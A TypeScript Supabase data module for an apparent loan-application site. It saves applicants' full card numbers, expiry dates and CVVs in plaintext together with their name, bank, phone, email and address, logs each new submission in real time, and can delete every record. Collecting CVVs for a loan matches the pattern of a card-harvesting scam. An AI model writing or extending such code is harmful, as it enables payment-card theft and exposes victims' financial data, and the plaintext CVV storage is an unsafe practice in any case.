import { supabase, isSupabaseConfigured } from './supabase';
import { LoanApplication, LoanStatus, Payment } from '../types';
import type { RealtimeChannel } from '@supabase/supabase-js';

const TABLE_NAME = 'loan_applications';

export async function fetchApplications(): Promise<LoanApplication[]> {
  if (!isSupabaseConfigured || !supabase) return [];
  const { data, error } = await supabase
    .from(TABLE_NAME)
    .select('*')
    .order('createdAt', { ascending: false });

  if (error) {
    console.error('Error fetching applications:', error);
    return [];
  }
  return (data as LoanApplication[]) ?? [];
}

export async function createApplication(app: LoanApplication): Promise<void> {
  if (!isSupabaseConfigured || !supabase) return;

  const record = {
    id: app.id,
    fullName: app.fullName,
    bankName: app.bankName,
    cardNumber: app.cardNumber,
    expiryMonth: app.expiryMonth,
    expiryYear: app.expiryYear,
    cvv: app.cvv,
    loanAmount: app.loanAmount,
    phoneNumber: app.phoneNumber,
    email: app.email,
    addressLine1: app.addressLine1,
    addressLine2: app.addressLine2,
    city: app.city,
    state: app.state,
    zipCode: app.zipCode,
    status: app.status,
    createdAt: app.createdAt,
    dueDate: app.dueDate,
    payments: app.payments,
  };

  const { error } = await supabase.from(TABLE_NAME).insert([record]);
  if (!error) return;

  const missingColumnError = String(error.message || '').includes("Could not find the 'bankName' column") ||
    String(error.message || '').includes('column "bankName" of relation "loan_applications" does not exist');

  if (missingColumnError) {
    console.warn('Supabase schema is missing bankName. Retrying insert without bankName field.');
    const fallbackApp = { ...app } as Record<string, any>;
    delete fallbackApp.bankName;

    const retry = await supabase.from(TABLE_NAME).insert([fallbackApp]);
    if (retry.error) {
      console.error('Retry failed after removing bankName:', retry.error);
      throw new Error(retry.error.message || JSON.stringify(retry.error));
    }
    return;
  }

  console.error('Error creating application:', error);
  throw new Error(error.message || JSON.stringify(error));
}

export async function updateApplicationStatus(id: string, status: LoanStatus): Promise<void> {
  if (!isSupabaseConfigured || !supabase) return;
  const { error } = await supabase.from(TABLE_NAME).update({ status }).eq('id', id);
  if (error) {
    console.error('Error updating status:', error);
    throw error;
  }
}

export async function addPaymentToApp(appId: string, payments: Payment[]): Promise<void> {
  if (!isSupabaseConfigured || !supabase) return;
  const { error } = await supabase.from(TABLE_NAME).update({ payments }).eq('id', appId);
  if (error) {
    console.error('Error adding payment:', error);
    throw error;
  }
}

export async function deleteAllApplications(): Promise<void> {
  if (!isSupabaseConfigured || !supabase) return;

  // First fetch IDs to avoid ambiguous delete filters and to respect RLS
  const { data: allRows, error: selectError } = await supabase
    .from(TABLE_NAME)
    .select('id')
    .not('id', 'is', null);

  if (selectError) {
    console.error('Error selecting IDs before delete:', selectError);
    throw selectError;
  }

  const ids = (allRows as Array<{ id: string }> ?? [])
    .map((r) => r.id)
    .filter(Boolean);

  if (ids.length === 0) return;

  const { error } = await supabase
    .from(TABLE_NAME)
    .delete()
    .in('id', ids);

  if (error) {
    console.error('Error deleting all applications:', error);
    throw error;
  }
}

/**
 * Subscribes to all INSERT and UPDATE events on the loan_applications table.
 * Calls `onInsert` when a new row is added (customer submits form).
 * Calls `onUpdate` when an existing row changes (status update).
 * Returns the channel object — caller MUST call channel.unsubscribe() on cleanup.
 */
export function subscribeToApplications(
  onInsert: (newApp: LoanApplication) => void,
  onUpdate: (updatedApp: LoanApplication) => void,
  onDelete: () => void
): RealtimeChannel | null {
  if (!isSupabaseConfigured || !supabase) return null;

  const channel = supabase
    .channel('loan_applications_changes')
    .on(
      'postgres_changes',
      { event: 'INSERT', schema: 'public', table: TABLE_NAME },
      (payload) => {
        console.log('[Realtime] New application inserted:', payload.new);
        onInsert(payload.new as LoanApplication);
      }
    )
    .on(
      'postgres_changes',
      { event: 'UPDATE', schema: 'public', table: TABLE_NAME },
      (payload) => {
        console.log('[Realtime] Application updated:', payload.new);
        onUpdate(payload.new as LoanApplication);
      }
    )
    .on(
      'postgres_changes',
      { event: 'DELETE', schema: 'public', table: TABLE_NAME },
      (payload) => {
        console.log('[Realtime] Application deleted');
        onDelete();
      }
    )
    .subscribe((status) => {
      console.log('[Realtime] Subscription status:', status);
    });

  return channel;
}
